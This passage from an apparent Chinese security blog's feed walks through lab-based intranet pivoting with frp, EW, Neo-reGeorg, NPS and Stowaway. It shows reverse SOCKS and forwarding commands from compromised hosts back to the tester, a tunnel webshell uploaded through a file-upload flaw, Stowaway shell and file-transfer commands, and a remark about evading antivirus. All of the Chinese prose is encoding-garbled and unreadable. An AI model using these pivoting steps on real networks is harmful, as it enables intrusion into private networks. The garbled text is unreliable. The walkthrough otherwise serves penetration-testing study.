class="hljs-attribute">bind_addr</span>=web-ip<br>bind_port = 7000<br><br>å†…ç½‘ä¸»æœº1<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 10.10.3.18 # VPS ip<br>server_port = 7000 # ä¸æœåŠ¡å™¨ç«¯å£å¯¹åº”<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">remote_port</span>=6000<br><span class="hljs-attribute">plugin</span>=socks5<br><br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114755986.png" alt="image-20210805114755986"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114714780.png" alt="image-20210805114714780"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114604466.png" alt="image-20210805114604466"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114411169.png" alt="image-20210805114411169"></p><blockquote><p>è¿æ¥å»ºç«‹äº†ï¼Œä½†æ˜¯åé¢çš„ä»£ç†æœåŠ¡å™¨è¿æ¥å¤±è´¥ä¸çŸ¥é“å…·ä½“æ˜¯ä»€ä¹ˆæ„æ€ï¼Œä½†æ˜¯ä»¥åŠå¯ä»¥è¿æ¥å†…ç½‘ä¸»æœºäº†</p></blockquote><p>è¿æ¥æˆåŠŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114320315.png" alt="image-20210805114320315"></p><p>ä¸‰çº§ä»£ç†å°±ç±»ä¼¼çš„æ¥å³å¯</p><h2 id="ewä»£ç†"><a href="#ewä»£ç†" class="headerlink" title="ewä»£ç†"></a>ewä»£ç†</h2><h3 id="ä¸€çº§ä»£ç†-1"><a href="#ä¸€çº§ä»£ç†-1" class="headerlink" title="ä¸€çº§ä»£ç†"></a>ä¸€çº§ä»£ç†</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805130313193.png" alt="image-20210805130313193"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10ï¼šew_for_win_32.exe -s rcsocks -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>WebæœåŠ¡å™¨ï¼šew_for_win_32.exe -s rssocks -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805131042550.png" alt="image-20210805131042550"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805130844477.png" alt="image-20210805130844477"></p><p>è¿æ¥å†…ç½‘ä¸»æœºæˆåŠŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805131203118.png" alt="image-20210805131203118"></p><h3 id="äºŒçº§ä»£ç†-1"><a href="#äºŒçº§ä»£ç†-1" class="headerlink" title="äºŒçº§ä»£ç†"></a>äºŒçº§ä»£ç†</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805133050867.png" alt="image-20210805133050867"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10ï¼šew_for_Win.exe -s lcx_listen -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>å†…ç½‘ä¸»æœº<span class="hljs-number">1</span>ï¼šew_for_Win.exe -s ssocksd -l <span class="hljs-number">9000</span><br>WebæœåŠ¡å™¨ï¼šew_for_Win.exe -s lcx_slave -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span> -f <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.131</span> -g <span class="hljs-number">9000</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132433015.png" alt="image-20210805132433015"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132401981.png" alt="image-20210805132401981"></p><p>éš§é“æ­å»ºæˆåŠŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132209244.png" alt="image-20210805132209244"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132241110.png" alt="image-20210805132241110"></p><blockquote><p>è¿æ¥æ—¶å·¥å…·ä¼šçªç„¶åœæ­¢è¿è¡Œï¼Œå…·ä½“åŸå› ä¸æ¸…æ¥š</p></blockquote><h3 id="ä¸‰çº§ä»£ç†"><a href="#ä¸‰çº§ä»£ç†" class="headerlink" title="ä¸‰çº§ä»£ç†"></a>ä¸‰çº§ä»£ç†</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805135020239.png" alt="image-20210805135020239"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10ï¼šew_for_Win.exe -s rcsocks -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>WebæœåŠ¡å™¨ï¼šew_for_Win.exe -s lcx_slave -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span> -f <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.131</span> -g <span class="hljs-number">9000</span><br>å†…ç½‘ä¸»æœº<span class="hljs-number">1</span>ï¼šew_for_Win.exe -s lcx_listen -l <span class="hljs-number">9000</span> -e <span class="hljs-number">7000</span><br>å†…ç½‘ä¸»æœº<span class="hljs-number">2</span>ï¼šew_for_Win.exe -s rssocks -d <span class="hljs-number">10.10</span><span class="hljs-number">.21</span><span class="hljs-number">.128</span> -e <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure><blockquote><p>éš§é“çš„çº§æ•°è¶Šå¤§æ‰€è¿æ¥éœ€è¦çš„æ—¶é—´å°±è¶Šé•¿äº†</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140125688.png" alt="image-20210805140125688"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140156398.png" alt="image-20210805140156398"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140253519.png" alt="image-20210805140253519"></p><p>è¿æ¥æˆåŠŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140008622.png" alt="image-20210805140008622"></p><blockquote><p>å·¥å…·æ„Ÿè§‰è¿˜æ˜¯å®¹æ˜“è¢«æ€æ¯’è½¯ä»¶æ€æ‰ï¼Œè¿˜æ˜¯éœ€è¦è‡ªå·±å»ç¼–å†™ï¼Œæˆ–è€…è‡ªå·±åšå¥½å…æ€å¤„ç†</p></blockquote><h2 id="Neo-reGeory"><a href="#Neo-reGeory" class="headerlink" title="Neo-reGeory"></a>Neo-reGeory</h2><blockquote><p>å»ºç«‹HTTPéš§é“çš„å·¥å…·ï¼Œé€‚ç”¨äºç›®æ ‡æœåŠ¡å™¨åªå¼€æ”¾äº†80ç«¯å£ï¼Œé€šè¿‡80ç«¯å£å»æ¢æµ‹å†…ç½‘æœåŠ¡å™¨ã€‚ï¼ˆåˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´å³å¯ï¼‰</p></blockquote><p>ä¸‹è½½ï¼š<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p>å‚è€ƒè¿æ¥</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/110389330">https://blog.csdn.net/qq_32393893/article/details/110389330</a></p><p>è¿è¡Œå‘½ä»¤ç”Ÿæˆåé¢æ–‡ä»¶ï¼š<code>python neoreg.py generate -k lcdm123 </code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806093956906.png" alt="image-20210806093956906"></p><p>ä¸Šä¼ æœåŠ¡å™¨æ”¯æŒçš„å¯¹åº”æ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094624888.png" alt="image-20210806094624888"></p><blockquote><p>æµ‹è¯•æ–‡ä»¶åœ¨çº¿</p></blockquote><p>ä¸Šä¼ åæœ¬åœ°æ­å»ºè¿æ¥ï¼š<code>python neoreg.py -k lcdm123 -u http://web-ip/tunnel.php -p 6000</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094746686.png" alt="image-20210806094746686"></p><p>æµ‹è¯•è¿æ¥ä»£ç†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094918799.png" alt="image-20210806094918799"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806095050984.png" alt="image-20210806095050984"></p><p>æˆåŠŸäº†</p><h2 id="NPC-amp-NPS"><a href="#NPC-amp-NPS" class="headerlink" title="NPC&amp;NPS"></a>NPC&amp;NPS</h2><p><a href="https://aquilao.github.io/Blog/NPS/">https://aquilao.github.io/Blog/NPS/</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210907145149529.png" alt="image-20210907145149529"></p><p>è¿™ä¸ªçš„è¿è¡Œæ˜¯èº«ä»½ç®€å•çš„ï¼Œç”± NPS ç”Ÿæˆä¸€ä¸ª web æœåŠ¡ç«¯ï¼Œç„¶åå°† npcä¸Šä¼ åˆ°é¶æœºä¸ŠæŒ‰ç…§ web æœåŠ¡ç«¯ç»™å‡ºçš„å‘½ä»¤æ‰§è¡Œå³å¯</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># NPS é…ç½®  ç¼–è¾‘ conf/nps.conf</span><br><span class="hljs-comment">#web</span><br>web_host=192.168.1.15  <span class="hljs-comment"># æœåŠ¡å™¨çš„ip</span><br>web_username=admin  <span class="hljs-comment"># ç™»å½•ç”¨æˆ·å</span><br>web_password=admin  <span class="hljs-comment"># ç™»å½•å¯†ç </span><br>web_port = 8080   <span class="hljs-comment"># webç«¯å£</span><br><br>å°†å·¥å…·ä¸Šä¼ åˆ°äº†æœåŠ¡å™¨åï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ­¤æ‰§è¡Œåˆ™éœ€è¦è¿è¡Œ  sudo ./nps install<br>å¼€å¯nps  nps start<br>./nps test|<span class="hljs-string">start</span>|<span class="hljs-string">stop</span>|<span class="hljs-string">restart</span>|<span class="hljs-string">status  æµ‹è¯•é…ç½®æ–‡ä»¶</span>|<span class="hljs-string">å¯åŠ¨</span>|<span class="hljs-string">åœæ­¢</span>|<span class="hljs-string">é‡å¯</span>|<span class="hljs-string">çŠ¶æ€</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210907150908264.png" alt="image-20210907150908264"></p><blockquote><p>ç™»å½•åˆ° web ç«¯ï¼Œç„¶åç‚¹å‡»å®¢æˆ·ç«¯ï¼Œä½¿ç”¨æ–°å¢ï¼Œä¹‹åå°±ä¼šæœ‰è¿æ¥çš„å‘½ä»¤ï¼Œåªéœ€è¦æŠŠ npc çš„ä¼ å…¥é¶æœºè¿è¡Œå³å¯</p></blockquote><h2 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h2><p><a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p><blockquote><p>æ¯”è¾ƒæ–°æ¬¾çš„ä½¿ç”¨ go ç¼–å†™çš„å†…ç½‘ä»£ç†å·¥å…·ï¼Œæ˜Ÿé“¾è®¡åˆ’æ¨èï¼Œåº”è¯¥ä¼šæŒç»­æ›´æ–°</p></blockquote><ul><li><code>admin</code> æ¸—é€æµ‹è¯•è€…ä½¿ç”¨çš„ä¸»æ§ç«¯</li><li><code>agent</code> æ¸—é€æµ‹è¯•è€…éƒ¨ç½²çš„è¢«æ§ç«¯</li></ul><p><strong>Admin</strong></p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml">å‚æ•°:<br>-<span class="ruby">l è¢«åŠ¨æ¨¡å¼ä¸‹çš„ç›‘å¬åœ°å€[ip]<span class="hljs-symbol">:&lt;port&gt;</span></span><br><span class="ruby">-s èŠ‚ç‚¹é€šä¿¡åŠ å¯†å¯†é’¥,æ‰€æœ‰èŠ‚ç‚¹(admin&amp;&amp;agent)å¿…é¡»ä¸€è‡´</span><br><span class="ruby">-c ä¸»åŠ¨æ¨¡å¼ä¸‹çš„ç›®æ ‡èŠ‚ç‚¹åœ°å€</span><br><span class="ruby">--proxy socks5ä»£ç†æœåŠ¡å™¨åœ°å€</span><br><span class="ruby">--proxyu socks5ä»£ç†æœåŠ¡å™¨ç”¨æˆ·å(å¯é€‰)</span><br><span class="ruby">--proxyp socks5ä»£ç†æœåŠ¡å™¨å¯†ç (å¯é€‰)</span><br><span class="ruby">--down ä¸‹æ¸¸åè®®ç±»å‹,é»˜è®¤ä¸ºè£¸TCPæµé‡,å¯é€‰HTTP</span><br></code></pre></td></tr></table></figure><p><strong>Agent</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å‚æ•°:<br>-l è¢«åŠ¨æ¨¡å¼ä¸‹çš„ç›‘å¬åœ°å€[ip]:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span></span><br>-s èŠ‚ç‚¹é€šä¿¡åŠ å¯†å¯†é’¥<br>-c ä¸»åŠ¨æ¨¡å¼ä¸‹çš„ç›®æ ‡èŠ‚ç‚¹åœ°å€<br>--proxy socks5ä»£ç†æœåŠ¡å™¨åœ°å€<br>--proxyu socks5ä»£ç†æœåŠ¡å™¨ç”¨æˆ·å(å¯é€‰)<br>--proxyp socks5ä»£ç†æœåŠ¡å™¨å¯†ç (å¯é€‰)<br>--reconnect é‡è¿æ—¶é—´é—´éš”<br>--rehost ç«¯å£å¤ç”¨æ—¶å¤ç”¨çš„IPåœ°å€<br>--report ç«¯å£å¤ç”¨æ—¶å¤ç”¨çš„ç«¯å£å·<br>--up ä¸Šæ¸¸åè®®ç±»å‹,é»˜è®¤ä¸ºè£¸TCPæµé‡,å¯é€‰HTTP<br>--down ä¸‹æ¸¸åè®®ç±»å‹,é»˜è®¤ä¸ºè£¸TCPæµé‡,å¯é€‰HTTP<br></code></pre></td></tr></table></figure><blockquote><p>åŠŸèƒ½å¤ªå¤šï¼Œä½¿ç”¨æ­¥éª¤å¥½å¤æ‚å‘€:cry:</p></blockquote><h3 id="ä¸€çº§ä»£ç†-2"><a href="#ä¸€çº§ä»£ç†-2" class="headerlink" title="ä¸€çº§ä»£ç†"></a>ä¸€çº§ä»£ç†</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917140954098.png" alt="image-20210917140954098"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">win10ï¼šwindows_x86_admin.exe -l <span class="hljs-number">9000</span> -s password <br>webæœåŠ¡å™¨: windows_x86_agent.exe -c <span class="hljs-number">192.168</span><span class="hljs-number">.44</span><span class="hljs-number">.1</span>:<span class="hljs-number">9000</span> -reconnect <span class="hljs-number">5</span><br># è¿™æ ·ä¸¤å°ç”µè„‘å°±å»ºç«‹äº†è¿æ¥äº†<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143113458.png" alt="image-20210917143113458"></p><p>ä½¿ç”¨ssh è¿æ¥å†…ç½‘ä¸»æœº</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143151144.png" alt="image-20210917143151144"></p><p>å¼€å¯ socks5 ä»£ç†é€šé“</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143228545.png" alt="image-20210917143228545"></p><blockquote><p>å¯ä»¥ä½¿ç”¨ stopsocks åœæ­¢</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917142735471.png" alt="image-20210917142735471"></p><blockquote><p>ä¸€çº§ä»£ç†çš„æ­å»ºå°±æ˜¯è¿™ä¹ˆç®€å•</p></blockquote><h3 id="å¤šçº§ä»£ç†"><a href="#å¤šçº§ä»£ç†" class="headerlink" title="å¤šçº§ä»£ç†"></a>å¤šçº§ä»£ç†</h3><blockquote><p>ç°åœ¨ä¸€çº§ä»£ç†æ­å»ºå¥½åï¼Œå¯ä»¥ç›´æ¥å‡†å¤‡äºŒçº§ä»£ç†ã€</p></blockquote><p>ä½¿ç”¨ admin åœ¨ç›¸åº”çš„èŠ‚ç‚¹å»ºç«‹ç›‘å¬</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152142891.png" alt="image-20210917152142891"></p><p>ç„¶ååœ¨å†…ç½‘ä¸»æœºæ‰§è¡Œè¿æ¥æ“ä½œ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152234610.png" alt="image-20210917152234610"></p><p>ä¹‹åå°±ä¼šè¿æ¥æˆåŠŸäº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152258505.png" alt="image-20210917152258505"></p><blockquote><p>è¿™é‡Œä½¿ç”¨ connect å‘½ä»¤è¿æ¥ä¸ä¸Šï¼Œå…·ä½“åŸå› æš‚æ—¶ä¸æ¸…æ¥š</p><p>æ“ä½œæ­¥éª¤ï¼šå†…ç½‘é¶æœºè®¾ç½®ç›‘å¬  -l  ï¼›admin æ‰§è¡Œ connect æ“ä½œè¿æ¥ä¸»æœºå“åº”ç«¯å£</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152624930.png" alt="image-20210917152624930"></p><blockquote><p>å·¥å…·åŸºç¡€æ“ä½œå…¶å®ä¹Ÿå¹¶ä¸éš¾ï¼Œå°±æ˜¯ä½“ç§¯æœ‰ç‚¹å¤§ï¼Œå¤šçº§ä»£ç†çš„æ“ä½œå°±ç±»ä¼¼</p></blockquote><h3 id="å‘½ä»¤è§£é‡Š"><a href="#å‘½ä»¤è§£é‡Š" class="headerlink" title="å‘½ä»¤è§£é‡Š"></a>å‘½ä»¤è§£é‡Š</h3><ul><li><p>å‘½ä»¤ agent ç›‘å¬æŸä¸ªç«¯å£å¹¶ç­‰å¾…å­èŠ‚ç‚¹çš„æ¥å…¥ï¼š<code>listen</code></p><blockquote><ol><li><code>Normal passive</code>ï¼šagent å°†ä¼šä»¥æ™®é€šçš„æ–¹å¼ç›‘å¬ç›®æ ‡ç«¯å£ï¼Œå¹¶ç­‰å¾…å­èŠ‚ç‚¹æ¥å…¥</li><li><code>IPTables Reuse</code>ï¼šagetnt å°†ä»¥ IPTable Reuse çš„æ–¹å¼å¤ç”¨ç«¯å£ï¼Œå¹¶ç­‰å¾…å­èŠ‚ç‚¹æ¥å…¥</li><li><code>SOReuse</code>ï¼šagent å°†ä¼šä»¥ SOReuse çš„æ–¹å¼å¤ç”¨ç«¯å£ï¼Œå¹¶ç­‰å¾…å­èŠ‚ç‚¹æ¥å…¥</li></ol><p><code>listen</code>  ä¸€æ¬¡åªèƒ½æ¥å—ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œè‹¥éœ€è¦å¤šä¸ªå­èŠ‚ç‚¹è¿å…¥ï¼Œéœ€è¦å¤šæ¬¡æ‰§è¡Œ</p></blockquote></li><li><p>ä½¿ç”¨ ssh è¿æ¥ç›®æ ‡æœºå™¨ï¼š<code>ssh ip:port</code></p></li><li><p>è·å–å½“å‰èŠ‚ç‚¹çš„ shllï¼š<code>shell</code></p></li><li><p>åœ¨å½“å‰èŠ‚ç‚¹å¯åŠ¨ socks5 æœåŠ¡ï¼š<code>socks port</code></p></li><li><p>åœæ­¢ socks5 æœåŠ¡ï¼š<code>stopsocks</code></p></li><li><p>å‘½ä»¤å½“å‰èŠ‚ç‚¹è¿æ¥å¦ä¸€ä¸ªå­èŠ‚ç‚¹ï¼š<code>connect ip:port </code></p><blockquote><p>å…·ä½“ä½¿ç”¨å‚ç…§ä¸Šé¢çš„å¤šçº§ä»£ç†</p></blockquote></li><li><p>å‘½ä»¤å½“å‰èŠ‚ç‚¹ä»¥ ssh éš§é“çš„æ–¹æ³•è¿æ¥å¦ä¸€ä¸ªå­èŠ‚ç‚¹ï¼š<code>sshtunnel ip:22 port</code></p><blockquote><p>å…·ä½“ä½¿ç”¨å’Œ connect ç±»ä¼¼</p></blockquote></li><li><p>ä¸Šä¼ æ–‡ä»¶ï¼Œé€‰æ‹©å¥½ç›¸åº”èŠ‚ç‚¹  <code>upload filename </code></p></li><li><p>ä¸‹è½½æ–‡ä»¶ï¼Œé€‰æ‹©å¥½ç›¸åº”èŠ‚ç‚¹ <code>download filename</code></p></li><li><p>è¿”å›åˆ°ä¸» panelï¼š<code>back</code></p></li><li><p>æ˜ å°„ admin ä¸Šçš„ç«¯å£åˆ°è¿œç¨‹ç«¯å£ï¼š<code>forward 9000 127.0.0.1:22</code></p></li><li><p>å…³é—­å½“å‰èŠ‚ç‚¹çš„è¿œç¨‹æ˜ å°„ï¼š<code>stopforward</code></p></li><li><p>åå‘æ˜ å°„å½“å‰ç«¯ agent ç«¯å£åˆ° admin çš„æœ¬åœ°ç«¯å£ï¼š <code>backward 9001 22</code></p></li><li><p>å…³é—­å½“å‰èŠ‚ç‚¹çš„åå‘æ˜ å°„ï¼š<code>stopbackward</code></p></li><li><p>å‘½ä»¤å½“å‰èŠ‚ç‚¹ä¸‹çº¿ï¼š<code>shutdown</code></p></li></ul><h2 id="å…¶ä»–å·¥å…·æ­å»ºéš§é“"><a href="#å…¶ä»–å·¥å…·æ­å»ºéš§é“" class="headerlink" title="å…¶ä»–å·¥å…·æ­å»ºéš§é“"></a>å…¶ä»–å·¥å…·æ­å»ºéš§é“</h2><p><a href="https://v0w.top/2020/08/11/IntranetProxy/">https://v0w.top/2020/08/11/IntranetProxy/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å†…ç½‘éš§é“æ­å»ºå®è·µ&quot;&gt;&lt;a href=&quot;#å†…ç½‘éš§é“æ­å»ºå®è·µ&quot; class=&quot;headerlink&quot; title=&quot;å†…ç½‘éš§é“æ­å»ºå®è·µ&quot;&gt;&lt;/a&gt;å†…ç½‘éš§é“æ­å»ºå®è·µ&lt;/h1&gt;&lt;h2 id=&quot;netshéš§é“æ­å»º&quot;&gt;&lt;a href=&quot;#netshéš§é“æ­å»º&quot; class=&quot;he</summary>
      
    
    
    
    <category term="å†…ç½‘" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€çŸ¥è¯†ç‚¹</title>
    <link href="http://example.com/2021/10/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>http://example.com/2021/10/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2021-10-13T10:55:50.000Z</published>
    <updated>2021-10-13T10:56:35.735Z</updated>
    
    <content type="html"><![CDATA[<h1 id="çŸ¥è¯†ç‚¹æ¢³ç†-amp-å¤ç°"><a href="#çŸ¥è¯†ç‚¹æ¢³ç†-amp-å¤ç°" class="headerlink" title="çŸ¥è¯†ç‚¹æ¢³ç† &amp; å¤ç°"></a>çŸ¥è¯†ç‚¹æ¢³ç† &amp; å¤ç°</h1><blockquote><p>è¦æ±‚ï¼šå†™æ¸…æ¥šå„ä¸ªçŸ¥è¯†ç‚¹ï¼Œç¯å¢ƒæ­å»ºï¼Œæ¼æ´å¤ç°ï¼Œä½¿ç”¨çš„å·¥å…·ç­‰</p></blockquote><h2 id="ç³»ç»Ÿç›¸å…³"><a href="#ç³»ç»Ÿç›¸å…³" class="headerlink" title="ç³»ç»Ÿç›¸å…³"></a>ç³»ç»Ÿç›¸å…³</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h4><h5 id="æ–‡ä»¶ç®¡ç†"><a href="#æ–‡ä»¶ç®¡ç†" class="headerlink" title="æ–‡ä»¶ç®¡ç†"></a>æ–‡ä»¶ç®¡ç†</h5><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">ls</span> <span class="hljs-string">åˆ—ä¸¾å½“å‰ç›®å½•å†…å®¹</span><br><span class="hljs-attr">ls</span> <span class="hljs-string">-al æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬éšè—æ–‡ä»¶ï¼‰ï¼Œå¹¶ä¸”æ˜¾ç¤ºæ–‡ä»¶è¯¦ç»†ä¿¡æ¯ï¼ˆä¿®æ”¹æ—¶é—´ï¼Œæƒé™ç­‰ï¼‰</span><br><br><span class="hljs-attr">find</span> <span class="hljs-string">æŸ¥æ‰¾æ–‡ä»¶ï¼ˆæ ¹æ®æ–‡ä»¶çš„å±æ€§è¿›è¡ŒæŸ¥æ‰¾ï¼‰</span><br><span class="hljs-attr">find</span> <span class="hljs-string">/ -name demon.txt åœ¨æ ¹ç›®å½•ä¸‹æŸ¥æ‰¾è¯¥æ–‡ä»¶</span><br><span class="hljs-attr">grep</span> <span class="hljs-string">æŸ¥æ‰¾æ–‡ä»¶ï¼ˆæ ¹æ®æ–‡ä»¶çš„å†…å®¹è¿›è¡ŒæŸ¥æ‰¾ï¼‰ï¼Œå¯ä»¥æ­é…æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨</span><br><span class="hljs-attr">which</span> <span class="hljs-string">åœ¨PATHå˜é‡æŒ‡å®šçš„è·¯å¾„ä¸­ï¼Œæœç´¢æŸä¸ªç³»ç»Ÿå‘½ä»¤çš„ä½ç½®ï¼Œå¹¶ä¸”è¿”å›ç¬¬ä¸€ä¸ªç»“æœ</span><br><br><span class="hljs-attr">cat</span> <span class="hljs-string">è¾“å‡ºæ–‡ä»¶å†…å®¹</span><br><span class="hljs-attr">cat</span> <span class="hljs-string">-n æ˜¾ç¤ºå†…å®¹çš„åŒæ—¶æ‰“å°å‡ºè¡Œå·</span><br><span class="hljs-attr">tac</span> <span class="hljs-string">ä¸catç›¸åï¼Œä»æœ€åä¸€è¡Œæ‰“å°æ–‡ä»¶å†…å®¹</span><br><span class="hljs-attr">nl</span> <span class="hljs-string">æ˜¾ç¤ºæ–‡ä»¶å†…å®¹å¹¶ä¸”æ‰“å°è¡Œå·</span><br><span class="hljs-attr">head</span> <span class="hljs-string">æŸ¥çœ‹æ–‡ä»¶å‰å‡ è¡Œ</span><br><span class="hljs-attr">head</span> <span class="hljs-string">-n number filename.txt æ˜¾ç¤ºæ–‡ä»¶çš„å…ˆnumberè¡Œ</span><br><span class="hljs-attr">tail</span> <span class="hljs-string">æ˜¾ç¤ºæ–‡ä»¶ç»“å°¾å‡ è¡Œï¼ˆä¸headç›¸åï¼Œç”¨æ³•ç›¸ä¼¼ï¼‰</span><br><span class="hljs-attr">more</span> <span class="hljs-string">å¯¹äºæ¯”è¾ƒé•¿çš„æ–‡ä»¶å†…å®¹ä¼šåˆ†é¡µæ˜¾ç¤º</span><br><span class="hljs-attr">less</span> <span class="hljs-string">è‡ªç”±ä¸Šä¸‹ç¿»é¡µæŸ¥çœ‹æ–‡ä»¶å†…å®¹</span><br><br><span class="hljs-attr">touch</span> <span class="hljs-string">åˆ›å»ºæ–‡ä»¶</span><br><span class="hljs-attr">rm</span> <span class="hljs-string">åˆ é™¤æ–‡ä»¶</span><br><span class="hljs-attr">rm</span> <span 